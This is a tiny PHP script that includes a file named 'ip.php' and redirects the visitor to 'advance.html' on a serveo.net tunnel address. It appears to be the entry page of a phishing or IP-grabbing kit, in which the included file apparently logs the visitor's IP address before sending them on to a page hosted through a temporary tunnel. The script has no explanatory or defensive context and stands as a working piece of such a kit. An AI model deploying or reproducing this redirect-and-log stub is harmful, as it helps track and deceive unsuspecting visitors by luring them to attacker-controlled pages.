<?php
include 'ip.php';
header('Location: https://tenerum.serveo.net/advance.html');
exit
?>
